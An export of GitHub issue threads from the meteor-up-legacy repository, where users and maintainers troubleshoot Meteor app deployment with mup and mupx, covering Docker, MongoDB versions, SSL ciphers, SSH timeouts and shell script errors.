      <Body>If you look here at meteorD at the bottom is a link to a meteor issue with spiderable and possible solution that might be helpful.

https://github.com/meteorhacks/meteord
</Body>
    </Comment>
    <Comment>
      <Owner>berkaey</Owner>
      <Body>yeap I fixed it with that thanks ;) btw off topic but can we manually tell phantomjs to wait like 30s or something with meteor or with mupx?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I'm thinking not currently available but possibly a useful suggestion for the newer port underway at kadirahq. Maybe there is a phantom approach that will achieve your goal like...

http://charles.lescampeurs.org/2013/07/02/phantomjs-wait-for-it
</Body>
    </Comment>
  </Issue_152>
  <Issue_153>
    <Repository>meteor-up-legacy</Repository>
    <Title>application does not get a SIGTERM signal from upstart</Title>
    <Owner>arunoda</Owner>
    <Body>hi, I am using ubuntu 14.04.2 LTS and I am having some logic in my meteor app which needs to run on the `SIGTERM` signal. to be precise I am using the job-collection package and I want to make sure that the queue is shutdown gracefully before stopping the server.

the problem seems to be with foreverjs. if I remove foreverjs and directly use userdown in the upstart `script` blog, then it works.

so this does not work:

```
forever -c userdown --minUptime 2000 --spinSleepTime 1000 app/main.js
```

while this does

```
exec userdown app/main.js
```

I also tried specifying the `--killSignal` parameter which seemed to have no effect.

btw. why exactly are you using foreverjs? isn't upstart's `respawn` and `respawn limit` sufficient?

I am asking because that is currently my workaround and so far I can not see any problems with that.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>The future is docker and mupx now nearly ported to kadirahq. 
In a docker centric world the system is suppose to be fault tolerant so the idea of graceful shutdown redundant still if you use shutdown command (as one would be foolish not to if possible) all signals should properly complete current requests and finish all requests and reject new ones.
How that shutdown procedure happens with mupx on a docker image for you with the new kadirahq port would be interesting to know. Normally there is a mupx stop command to use I believe.
</Body>
    </Comment>
    <Comment>
      <Owner>SierraGolf</Owner>
      <Body>I assume that upstart is not used in mupx, but what about forever? how does the mupx setup makes sure the app restarts on failure?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I think it talks about meteorD and a flag for that here.
https://github.com/arunoda/meteor-up/tree/mupx?files=1#server-setup-details
</Body>
    </Comment>
  </Issue_153>
  <Issue_154>
    <Repository>meteor-up-legacy</Repository>
    <Title>MongoError: driver is incompatible with this server version</Title>
    <Owner>arunoda</Owner>
    <Body>How to fix it?

```
MongoError: driver is incompatible with this server version
[XXX.XXX.XX.XXX]     at Object.Future.wait (/bundle/bundle/programs/server/node_modules/fibers/future.js:398:15)
[XXX.XXX.XX.XXX]     at [object Object].MongoConnection._ensureIndex (packages/mongo/mongo_driver.js:790:1)
[XXX.XXX.XX.XXX]     at packages/aldeed_schema-index/lib/indexing.js:17:1
[XXX.XXX.XX.XXX]     at /bundle/bundle/programs/server/boot.js:249:5
[XXX.XXX.XX.XXX]     - - - - -
[XXX.XXX.XX.XXX]     at Object.toError (/bundle/bundle/programs/server/npm/npm-mongo/node_modules/mongodb/lib/mongodb/utils.js:114:11)
[XXX.XXX.XX.XXX]     at __executeInsertCommand (/bundle/bundle/programs/server/npm/npm-mongo/node_modules/mongodb/lib/mongodb/db.js:1926:27)
[XXX.XXX.XX.XXX]     at Db._executeInsertCommand (/bundle/bundle/programs/server/npm/npm-mongo/node_modules/mongodb/lib/mongodb/db.js:2028:5)
[XXX.XXX.XX.XXX]     at /bundle/bundle/programs/server/npm/npm-mongo/node_modules/mongodb/lib/mongodb/db.js:1348:12
[XXX.XXX.XX.XXX]     at /bundle/bundle/programs/server/npm/npm-mongo/node_modules/mongodb/lib/mongodb/db.js:1442:20
[XXX.XXX.XX.XXX]     at /bundle/bundle/programs/server/npm/npm-mongo/node_modules/mongodb/lib/mongodb/db.js:1196:16
[XXX.XXX.XX.XXX]     at /bundle/bundle/programs/server/npm/npm-mongo/node_modules/mongodb/lib/mongodb/db.js:1905:9
[XXX.XXX.XX.XXX]     at Server.Base._callHandler (/bundle/bundle/programs/server/npm/npm-mongo/node_modules/mongodb/lib/mongodb/connection/base.js:453:41)
[XXX.XXX.XX.XXX]     at /bundle/bundle/programs/server/npm/npm-mongo/node_modules/mongodb/lib/mongodb/connection/server.js:488:18
[XXX.XXX.XX.XXX]     at [object Object].MongoReply.parseBody (/bundle/bundle/programs/server/npm/npm-mongo/node_modules/mongodb/lib/mongodb/responses/mongo_reply.js:68:5)

```

i do not change anything
</Body>
    <State>open</State>
    <Comment>
      <Owner>yourcontainer</Owner>
      <Body>i fix this problem, i add unique: true prop to my field (using collection2 package)
</Body>
    </Comment>
    <Comment>
      <Owner>jykae</Owner>
      <Body>We are getting the same error from our "_ensureIndex" function calls, mupx seems to install the latest mongo container (currently 3.2.6), and in development we have 2.6.7 (that Meteor currently provides). @yourcontainer You mean that you added "unique: true" to simple-schema field, right?

Do you know if there is anyway to select MongoDB version in mupx ?
</Body>
    </Comment>
    <Comment>
      <Owner>yourcontainer</Owner>
      <Body>@jykae not, I deployed with "unique" key and get the error, without key no prob
</Body>
    </Comment>
    <Comment>
      <Owner>jykae</Owner>
      <Body>@yourcontainer Thanks for fast answer!
We also took away "_ensureIndex" unique checks and deployment went then fine. 
Defining docker container versions in config would be really nice for nodeJS and mongoDB for mupx.

Waiting curiously for this: https://github.com/meteor/meteor/issues/6957
And also this: https://github.com/meteor/meteor/pull/6923
</Body>
    </Comment>
    <Comment>
      <Owner>yourcontainer</Owner>
      <Body>@jykae sure, but meteor works only with specific versions, unfortunately
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>It would be wise to investigate a little deeper the new version ported to kadirahq/meteor-up and see if that helps.
The devs are there and can help resolve these new version issues with that version only. 
Otherwise you can deploy Mongo separately.
</Body>
    </Comment>
    <Comment>
      <Owner>jykae</Owner>
      <Body>Made mup.json configuration option for selecting exact MongoDB version, https://github.com/arunoda/meteor-up/pull/1023 

Kadira has same default here, https://github.com/kadirahq/meteor-up/blob/master/src/modules/mongo/assets/mongo-start.sh

So trying that out would not solve database driver incompatibility.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Oh maybe your ready for the ApolloStack by Meteor. It's in Alpha though people are able to integrate different multiple database storeage systems.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>No I think I was thinking you can customize the container with the new version.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>[&#9632; Sorry I was totally distracted by long weekend away.&#9632;]
Right 1023 Unfortunately I don't think any PRs have been acepted here for probably a year or 2. No devs with access are really monitoring this much.
These versions are depreciated so you will have to make your request and/or PR with the kadirahq version.
It's an easy fix though.
</Body>
    </Comment>
    <Comment>
      <Owner>jykae</Owner>
      <Body>@MasterJames Yep, I can see that this repo is not quite monitored anymore. I could point out this issue and PR for kadirahq.
</Body>
    </Comment>
  </Issue_154>
  <Issue_155>
    <Repository>meteor-up-legacy</Repository>
    <Title>Weak Diffie-Helman cipher</Title>
    <Owner>arunoda</Owner>
    <Body>While testing my site SSL cert deployed using Mupx, the ssllabs.com tester shows 1 issue. Not sure if this is a cipher suite issue or nginx.conf parameter. Any ideas? 

```
This server supports weak Diffie-Hellman (DH) key exchange parameters. Grade capped to B.
```

Cheers
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I think is suffers from something called Logjam. 
I imagine when the key is generated and/or deployed you can remove the Diffie-Hellman from the allowable Cyphers. 
I think long ago the weak ones were allowed for "export" and are called "export cipher suites".

I think SSLCipherSuite  is the target but which ones? Ones with DH in them maybe? 

Well that's all I could de-cipher on the subject for you today. I hope that's helpful info.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Maybe this link is useful.
For nginx it's "ssl_cipher" not Apache's SSLCipherSuite 
https://raymii.org/s/tutorials/Strong_SSL_Security_On_nginx.html

Shows these settings 
`
ssl_ciphers "EECDH+AESGCM:EDH+AESGCM:ECDHE-RSA-AES128-GCM-SHA256:AES256+EECDH:DHE-RSA-AES128-GCM-SHA256:AES256+EDH:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA:ECDHE-RSA-DES-CBC3-SHA:EDH-RSA-DES-CBC3-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA:DES-CBC3-SHA:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!MD5:!PSK:!RC4";
`
</Body>
    </Comment>
    <Comment>
      <Owner>edmundkwok</Owner>
      <Body>I submitted a pull request meteorhacks/mup-frontend-server#11 that implements a strong DH key and it just landed!

Docker Hub has build the image, so the next time you restart / deploy, you should get the latest image with this implemented. SSL Labs should be quite happy with the results. Please do test :)
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>That's awesome news!
</Body>
    </Comment>
  </Issue_155>
  <Issue_156>
    <Repository>meteor-up-legacy</Repository>
    <Title>Running external compiled programs (lftp) in mupx</Title>
    <Owner>arunoda</Owner>
    <Body>I need to run lftp commands from my Meteor app, so I am using the ftps NPM module( https://www.npmjs.com/package/ftps) to do so.

In my local testing environment, everything works fine.

In production, on an EC2 Ubuntu instance, inside my mupx docker container, the lftp command cannot be found (I've checked using FS existsSync, among other tests). I originally was using the apt-get version of lftp, but that version is too old (and didn't work for my app anyway), so I downloaded the latest version and compiled it on the server hosting my app. I confirmed it works correctly by running it on the command line on the server hosting my application.

However, I can't get my app to recognize the lftp command (located at: /usr/local/bin/lftp) at all. I keep getting issues when trying to run it as a spawned child process. I've scoured the issues section here on GitHub for mupx, as well as looked into issues with spawn. After vigorous testing, I am certain the issue is that the lftp command cannot be found inside the docker container. I have tried various suggestions such as setting environment variables and pseudo-hacks to mupx. Nothing seems to work..

If I want to run external, compiled Unix programs, such as lftp, from within my app inside its docker container, how do I do so?
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Are you calling from client or server side? 
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Anyway you'll have to manually modify your own patch here. Well you probably should do a PR of sorts in the new port over at kadirahq. I think they added or are adding custom docker image support.
Basically I would add something like...

```
Docker exec npm install ______
```

To the start.sh after the docker run commands https://github.com/arunoda/meteor-up/blob/mupx/templates/linux/start.sh

Or maybe use rcp to tramsfer the missing files but they need to be the right binaries for the target platform.
In that case maybe the Docker command adds a mount point needed for copying through into the Docker container.
</Body>
    </Comment>
  </Issue_156>
  <Issue_157>
    <Repository>meteor-up-legacy</Repository>
    <Title>Fix #871: Pass arguments after action to action</Title>
    <Owner>arunoda</Owner>
    <Body>This PR aims to fix the failure of the CLI when it is asked for logs and a config file for the environment is given.

Fixes #871 
</Body>
    <State>open</State>
    <Comment>
      <Owner>satyavh</Owner>
      <Body>6th of Feb...why doesn't this get merged? This solves my issue #1066 
</Body>
    </Comment>
  </Issue_157>
  <Issue_158>
    <Repository>meteor-up-legacy</Repository>
    <Title>Error while mup setup</Title>
    <Owner>arunoda</Owner>
    <Body>**mup.json file**
{
  // Server authentication info
  "servers": [
    {
      "host": "52.--.--.--.--",
      "username": "ubuntu",
      // "password": "password",
      // or pem file (ssh based authentication)
      "pem": "/home/fourtek/Downloads/Fourtekpem.pem",
      "sshOptions": { "Port" : 12345 }

```
}
```

  ],

  // Install MongoDB in the server, does not destroy local MongoDB on future setup
  "setupMongo": true,

  // WARNING: Node.js is required! Only skip if you already have Node.js installed on server.
  "setupNode": true,

  // WARNING: If nodeVersion omitted will setup 0.10.36 by default. Do not use v, only version number.
  "nodeVersion": "0.10.36",

  // Install PhantomJS in the server
  "setupPhantom": false,

  // Show a progress bar during the upload of the bundle to the server.
  // Might cause an error in some rare cases if set to true, for instance in Shippable CI
  "enableUploadProgressBar": true,

  // Application name (No spaces)
  "appName": "meteormanager",

  // Location of app (local directory)
  "app": "/home/fourtek/Documents/TestGraph",

  // Configure environment
  "env": {
    "ROOT_URL": "http://ec2-52-49-141-129.eu-west-1.compute.amazonaws.com"
  },

  // Meteor Up checks if the app comes online just after the deployment
  // before mup checks that, it will wait for no. of seconds configured below
  "deployCheckWaitTime": 15
}

when we type on terminal it givesa Error Like

**Error In Console**

&#8220; Checkout Kadira!
  It's the best way to monitor performance of your app.
  Visit: https://kadira.io/mup &#8221;

Started TaskList: Setup (linux)
[52.49.141.129] - Installing Node.js

events.js:72
        throw er; // Unhandled 'error' event
              ^
Error: Timed out while waiting for handshake
    at null._onTimeout (/usr/local/lib/node_modules/mup/node_modules/nodemiral/node_modules/ssh2/lib/client.js:138:17)
    at Timer.listOnTimeout [as ontimeout](timers.js:110:15)

**Please provide solution as soon as possible i had seen previous post but not get right solution**
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Changing the nodejs Version to 0.10.40 not 36 is required for Meteor 1.2 would be the first thing to suggest trying.
</Body>
    </Comment>
    <Comment>
      <Owner>edu2969</Owner>
      <Body>Issue resolved. I was using public IP addres, then I replace for internal IP addres.&#13;
So, I replace mi public IP&#13;
&#13;
"host": "172.xx.xx.xx"&#13;
&#13;
by internal IP getting throw ifconfig like&#13;
&#13;
"host": "192.168.x.xxx"&#13;
&#13;
Im using Meteor 1.4.3.2 in Debian 8, with Node 4.6.2 y NPM 2.15.11&#13;
&#13;
Good luck!</Body>
    </Comment>
  </Issue_158>
  <Issue_159>
    <Repository>meteor-up-legacy</Repository>
    <Title>MUP Fails running out of cron</Title>
    <Owner>arunoda</Owner>
    <Body>I have a set of scripts that watch a git repo for changes. If changes are detected, it does a git pull to fetch the updated files, then invokes another script to run the mup deploy.

The script is passed 2 arguments, the path of the meteor project, and the branch to deploy. 

Script looks like so:

```
#!/bin/bash -x
#
# Deploy meteor using MUP
#

PROJPATH=$1
BRANCH=$2

case $BRANCH in
        master)
         cd /app/meteor/git
         mup deploy
         ;;
        beta)
         cd /app/meteor/git/mobile-dashboard/mup/beta
         DEBUG=* mup deploy
         ;;
        dev)
         cd /app/meteor/git/mobile-dashboard/mup/dev
         DEBUG=* mup deploy
         ;;
esac
```

This script works 100% of the time if manually invoked from a shell.

The script fails 100% of the time when run from cron. The log looks like so:

```
    Meteor Up: Production Quality Meteor Deployments
    ------------------------------------------------

    &#8220; Checkout Kadira!
    It's the best way to monitor performance of your app.
    Visit: https://kadira.io/mup &#8221;

    Building Started: /app/meteor/git/mobile-dashboard
```

With no other output in /var/log/upstart logs or elsewhere.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I've considered building that directly into the deployment itself. So just replace the files directly, but maybe more complicated then the script you showed. Maybe you could use scp directly overwrite the built files if doing from the deployment is not feasible. If using mupx you might find this process easy via docker exec command as well.
It otherwise sounds mayne like a permissions issue. There's various Googleable ideas to check up on.
</Body>
    </Comment>
    <Comment>
      <Owner>jeffhmngi</Owner>
      <Body>I did manage to get some more output from when this is running from cron.

I have 4 different meteor projects with different codebases and they all return this error when MUP is run from cron.

'''
events.js:72
        throw er; // Unhandled 'error' event
              ^
Error: spawn ENOENT
    at errnoException (child_process.js:1011:11)
    at Process.ChildProcess._handle.onexit (child_process.js:802:34)
'''

This is running with the same user in cron as it is when run from an interactive shell. So It's not a permissions issue. Feels like MUP is looking for an env variable or something in a path that isn't there when invoked from cron, but is there when run from a normal shell.
</Body>
    </Comment>
  </Issue_159>
  <Issue_160>
    <Repository>meteor-up-legacy</Repository>
    <Title>Error when deploying to server</Title>
    <Owner>arunoda</Owner>
    <Body>The following error is from "mup logs", don't know why is this happening.

`[www.com.com]  &gt;&gt; stepping down to gid: meteoruser

&gt; &gt; stepping down to uid: meteoruser
&gt; &gt; error: Forever detected script exited with code: 143
&gt; &gt; error: Script restart attempt #76
&gt; &gt; stepping down to gid: meteoruser
&gt; &gt; stepping down to uid: meteoruser
&gt; &gt; stepping down to gid: meteoruser
&gt; &gt; stepping down to uid: meteoruser
&gt; &gt; stepping down to gid: meteoruser
&gt; &gt; stepping down to uid: meteoruser
&gt; &gt; `
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>This link suggests it's the deploy wait time that might help?
https://github.com/arunoda/meteor-up/issues/36
</Body>
    </Comment>
  </Issue_160>
  <Issue_161>
    <Repository>meteor-up-legacy</Repository>
    <Title>Cannot mount volume to mongodb docker container.</Title>
    <Owner>arunoda</Owner>
    <Body>I can't figure out how to do use mongorestore on the docker container mupx creates. Please if you know how please post instructions. 

I don't know why this is not laid out in the docs. What if you want to restore database to production using mupx? 

Here is my issue. I have used scp to copy my mongodb dump folder to my server in the root directory. 

Since mongodb is inside a docker container. I am trying to mount the folder to the docker container. 

I searched online and found the command but it is not working. This is the command I am using:

`docker run -v /memrey_dump_1_24_16:/mongobackup mongodb`

this is copying the folder `memrey_dump_1_24_16` to /mongobackup folder inside the docker container. 

But when I run this command I get the error

```
Unable to find image 'mongodb:latest' locally
Pulling repository docker.io/library/mongodb
Error: image library/mongodb:latest not found
```

What can I do. Please help by posting instructions on how I can simply accomplish mongorestore to production with mupx.  
</Body>
    <State>open</State>
    <Comment>
      <Owner>sferoze</Owner>
      <Body>I figured out how to do it

Here are the instructions

1) Copy dump folder to server

`scp -r /local_path/to/dump_folder root@111.222.33.4:/remote/path`

2) SSH into server

`ssh root@111.222.33.4`

3) Copy from root of server to inside docker container

`docker cp dump_folder mongodb:/dump_folder`

4) Go into mongodb docker container

`docker exec -it mongodb bash`

5) check if copied folder exists

`ls` (you should see dump_folder, if you named it the same folder as in this example)

6) use mongorestore

`mongorestore --drop -d AppName dump_folder`
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>The folder mupx copies to is defined here /var/lib/mongodb  
https://github.com/arunoda/meteor-up/blob/91e33a24dc26e306f5bf10c319a57211dfc832b1/templates/linux/mongodb.conf

Also this script is part of mupx setup that does the database setup install if requested true in settings file.
https://github.com/arunoda/meteor-up/blob/mupx/scripts/linux/install-mongodb.sh
I hope you find this useful.
The mongo restore backup stuff for clarity for others reading is only available through my PR.
There is changes to that Readme and the help stuff thats spit out when mupx is called in error.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Ah I see you posted that at the same time or before I could complete. Anyway well done and thanks for posting your steps.
</Body>
    </Comment>
  </Issue_161>
  <Issue_162>
    <Repository>meteor-up-legacy</Repository>
    <Title>After mup install, command not found (Mac OSX)</Title>
    <Owner>arunoda</Owner>
    <Body> $ mup init
bash: mup: command not found
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>I suspect a path issue if you Uninstall and install again with or without the global -g flag does it make a difference?
Echo out your path and check where with the which command.
Also reinstalling npm might correct things.
This could also be a default permission issue where a user's defaults can cause it to be unexecutable or unreadable etc.
You should check the permissions as well then.
</Body>
    </Comment>
  </Issue_162>
  <Issue_163>
    <Repository>meteor-up-legacy</Repository>
    <Title>App is not connecting to server after restart app on iOS </Title>
    <Owner>arunoda</Owner>
    <Body>HOLY GUACAMOLE!
I have a strange problem.
1. I have disabled Hot Code Push with `solderzzc:disable-hot-code-push`
2. I have set up my AWS EC2 with `mup`

when I create a 
`meteor build` with `--server=IP:PORT` flag 
or try it with 
`meteor run ios-device --mobile-server=IP:PORT` -flag

my app is working like expected on first run and is connected with the aws ec2 server. It works also fine with testflight and so on BUT when I close (not in the background. a "real" app shutdown) the app and do a second coldstart my app cant connect to the server anymore. It looks like its changing the servers IPs so my app cant connect anymore.

any ideas how to fix this?

my mup env settings:

  "env": {
    "ROOT_URL": "http://54.218.x.x",
    "MOBILE_ROOT_URL": "http://54.218.x.x",
    "PORT": 3000
  },
</Body>
    <State>open</State>
    <Comment>
      <Owner>rlech</Owner>
      <Body>after using xcode&#180;s profiler and analyzing the network traffic it looks like the initial coldstart is using my set IP:PORT but after the second coldstart its using also my IP but its trying to connect my server with PORT 80 ?!?!?! changing my configurations all to port 80 make the stuff working also after the second coldstart. 

this is strange. I  have set the PORT when I was building the app and I have set the PORT in my mup config but its still trying to connect to 80 when I restart it.

I really dont like to use PORT 80 for an app only version any clue how to strictly define the PORT ?
</Body>
    </Comment>
  </Issue_163>
  <Issue_164>
    <Repository>meteor-up-legacy</Repository>
    <Title>mupx verifying deployment fail with zsh </Title>
    <Owner>arunoda</Owner>
    <Body>Hi,

I get this error when I use zsh and used "mupx deploy". Any idea how to fix? Thanks. 

Verifying deployment: FAILED

```
-----------------------------------STDERR-----------------------------------
zsh:26: parse error near `]]'
-----------------------------------STDOUT-----------------------------------
----------------------------------------------------------------------------
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>ritchieng</Owner>
      <Body>Found the solution. I think the verify-deployment.sh file has an issue. 

Instead of while [[ true ]]; do on line 26. 

It should be while [true]; do

If anyone is facing the same issue, just go to your local folder under /usr/local/lib/node_modules/mupx/scripts

@arunoda Think there're many who use zsh and this would be a fix for them facing the same issues (saw a few highlighted with no answers). Made a pull request. 
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Ya no zsh scripty stuff is available on the deployment target server docker image (unless you change it) It is Ubuntu which uses bash.
</Body>
    </Comment>
  </Issue_164>
  <Issue_165>
    <Repository>meteor-up-legacy</Repository>
    <Title>[Suggestion] call shell command before starting updated app</Title>
    <Owner>arunoda</Owner>
    <Body>Little suggestion:
Some parameter in the `mup.json` where you can write a shell cmd in a string which is called on the server before the old app version is stopped and the new version is started.
(Would like to use this to call my shell script which does a mongodump and uploads this dump to my dropbox).

Any ideas on this? already possible? (couldn't find anything in the docs).

cheers, P
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Excellent idea! I hope they are listening here still. (A port to kadirahq is underway and maybe a few months off.)
I suspect there's another better way about it without a PR by using your own simple script in between mupx calls (eg. mupx stop).
Food for thought: In theory if a machine gets a proper shutdown, it will cause the calling of interrupts, so I'd be interested to know if it wouldn't then propagate this internally to the onStop callback of all meteor "subscribe" calls. I'd hope it would wait for a non-blocking call to complete the shutdown, so I guess you could try to make a backup that way?
http://docs.meteor.com/#/full/meteor_subscribe

Otherwise you can hack it (directly in the npm install folder) or do a PR more for yourself as they might still be able to merge it or utilize it with the ongoing port? and support (so maybe you should make a feature request over at the ported version too?)

And still you might find other postings about this to follow or that ultimately you need to solve this differently.
Of course you could have used the PR I posted here that includes mongo backup and restore, if it was ever merged along with 40+ others? I recommend taking my mupx branch (PR) and using it and then you can use the mupx commands exclusively to transfer a copy to you locally at the deployment machine and then you can do what you will with them. (Possibly directly via working in a Google Drive shared folder automatically, or up to Dropbox the same way too).
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>https://github.com/arunoda/meteor-up/pull/736

You could practically guess the API. I covered the basis with alias and such, but there are issues of complexity that make the subject complicated, and so you should read the changes in the docs, etc.
</Body>
    </Comment>
  </Issue_165>
  <Issue_166>
    <Repository>meteor-up-legacy</Repository>
    <Title>Websockets Error when deploying with meteor-up (Ubuntu 14.04) Use Aliyun</Title>
    <Owner>arunoda</Owner>
    <Body>Hi,

I'm using meteor-up when deploying to my Ubuntu 14.04 server and the handshake is failing for websockets with a 400 error.

Here is the exact error:
WebSocket connection to 'ws://123.57.23.127:7788/sockjs/505/qx52a1w_/websocket' failed: Error during WebSocket handshake: Unexpected response code: 400

It deploys perfectly fine, it doesn't throw out any errors either. 
Any idea what could be going on?

Here is my mup.json config, it's fairly simple
{
  "servers": [
    {
      "host": "",
      "password": "",
      "username": "root"
    }
  ],
  "setupMongo": true,
  "enableUploadProgressBar": true,
  "setupNode": true,
  "nodeVersion": "0.10.40",
  "setupPhantom": true,
  "appName": "",
  "app": "/Users/niko/www/meteor/test",
  "env": {
    "PORT" : 7788,
    "ROOT_URL": "http://123.57.23.127/"
  },
  "deployCheckWaitTime": 150
}

http://123.57.23.127:7788/
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>What is going on with the last line exactly? 7788? 
Looks like that wrong. Is it in the settings too or is it a link? 
</Body>
    </Comment>
    <Comment>
      <Owner>gitTerebi</Owner>
      <Body>I disabled cloudflare on the domain hosting app and after that error 400s disappeared.

Try that?
</Body>
    </Comment>
  </Issue_166>
  <Issue_167>
    <Repository>meteor-up-legacy</Repository>
    <Title>Deploy Logs on Server</Title>
    <Owner>arunoda</Owner>
    <Body>Hi Everyone

I've inherited an app...

Does anyone know if its possible to see on target server when &amp; what was last deployed? 

Is bundle zip stored somewhere with a timestamp perhaps?

Thanks!
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Maybe save your mupx logs? 
Of course on the target the database is in /var/lib/mongodb or something like that but it's not overwritten when deploying. Also you could look at the time stamps on the meteor folder etc.
</Body>
    </Comment>
  </Issue_167>
  <Issue_168>
    <Repository>meteor-up-legacy</Repository>
    <Title>How to connect remotely mongoDB from my another meteor instance</Title>
    <Owner>arunoda</Owner>
    <Body>I have 2 meteor app, the first one called A and the rest is B. I'm using mupx for deploy the first one in production server. So my question is how can i connect to mongo db in the first one (A) for the second one (B). Because of the first one use mupx for deploy, then mongo was contained by docker.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>You'll be setting the MONGO_URL in the mupx settings file.
The bottom of this article may help with that as would the mupx docs.
http://meteortips.com/deployment-tutorial/digitalocean-part-1/

Note: mupx the development branch of mup is also preferred over mup.
</Body>
    </Comment>
    <Comment>
      <Owner>haunguyen90</Owner>
      <Body>mupx using docker and it wrap mongo db inside, so it is impossible for connect to mongo remotely
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Kind of. If you ssh into the target you can use docket exec command and also note the files are mounted by the Mongo docker container from /var/lib/mongodb or something like that. [Ask for clarity if you need more confirmation on location etc.]
</Body>
    </Comment>
    <Comment>
      <Owner>haunguyen90</Owner>
      <Body>I'm sorry, maybe my english is not good, my situation is: I have a meteor app (A) using mupx for deploy on production server.
And now I have another meteor app (B) and I want B connect to mongo of A
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>When you deploy the second one with a new mupx settings file you can set the MONGO_URL to point to any Mongo database in the world.
There is varied help found when googling.
https://forums.meteor.com/t/solved-what-to-use-in-mongo-url-on-mupx-setup/10917
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Right so you may have to run the dB separately for both and make sure its accessible. Maybe opening the right ports to the somewhat encapsulated 1st deployment etc. is too much trouble for you.
</Body>
    </Comment>
  </Issue_168>
  <Issue_169>
    <Repository>meteor-up-legacy</Repository>
    <Title>Mup deploy constantly failing.</Title>
    <Owner>arunoda</Owner>
    <Body>Guys,

I'm having a devils own job trying to get mup to deploy my latest server.

I've been at it all day and have now got to the following error and can get no further.
I've had to install all of the node modules by hand using an updated version of npm (the only one I can get to work 1 out of 3 times without failing without getting connection resets).

I now have no idea where to go from here to get this working ? 

Any clues? Please? Anyone?

Peter.

x Invoking deployment process: FAILED

```
-----------------------------------STDERR-----------------------------------
lib_file=node.lib',
gyp info spawn args   '-Dmodule_root_dir=/opt/taralgadash/tmp/bundle/programs/server/npm/npm-bcrypt/node_modules/bcrypt',
gyp info spawn args   '--depth=.',
gyp info spawn args   '--no-parallel',
gyp info spawn args   '--generator-output',
gyp info spawn args   'build',
gyp info spawn args   '-Goutput_dir=.' ]
gyp info spawn make
gyp info spawn args [ 'BUILDTYPE=Release', '-C', 'build' ]
gyp info ok
npm WARN meteor-dev-bundle@0.0.0 No description
npm WARN meteor-dev-bundle@0.0.0 No repository field.
npm WARN meteor-dev-bundle@0.0.0 No license field.
stop: Unknown instance:
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
```

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to localhost port 3080: Connection refused
    stop: Unknown instance:
    Latest deployment failed! Reverted back to the previous version.
    -----------------------------------STDOUT-----------------------------------
    MODULE(target) Release/obj.target/bcrypt_lib.node
      COPY Release/bcrypt_lib.node
    make: Leaving directory `/opt/taralgadash/tmp/bundle/programs/server/npm/npm-bcrypt/node_modules/bcrypt/build'

```
&gt; fibers@1.0.5 install /opt/taralgadash/tmp/bundle/programs/server/node_modules/fibers
&gt; node ./build.js

`linux-x64-v8-3.14` exists; testing
Binary is fine; exiting
meteor-dev-bundle@0.0.0 /opt/taralgadash/tmp/bundle/programs/server
&#9500;&#9472;&#9516; chalk@0.5.1
&#9474; &#9500;&#9472;&#9472; ansi-styles@1.1.0
&#9474; &#9500;&#9472;&#9472; escape-string-regexp@1.0.4
&#9474; &#9500;&#9472;&#9516; has-ansi@0.1.0
&#9474; &#9474; &#9492;&#9472;&#9472; ansi-regex@0.2.1
&#9474; &#9500;&#9472;&#9472; strip-ansi@0.3.0
&#9474; &#9492;&#9472;&#9472; supports-color@0.2.0
&#9500;&#9472;&#9516; eachline@2.3.3
&#9474; &#9492;&#9472;&#9472; type-of@2.0.1
&#9500;&#9472;&#9472; fibers@1.0.5
&#9500;&#9472;&#9472; semver@4.1.0
&#9500;&#9472;&#9516; source-map-support@0.2.8
&#9474; &#9492;&#9472;&#9516; source-map@0.1.32
&#9474;   &#9492;&#9472;&#9472; amdefine@0.1.0
&#9492;&#9472;&#9472; underscore@1.5.2

Waiting for MongoDB to initialize. (5 minutes)
connected
taralgadash start/running, process 26450
Waiting for 350 seconds while app is booting up
Checking is app booted or not?
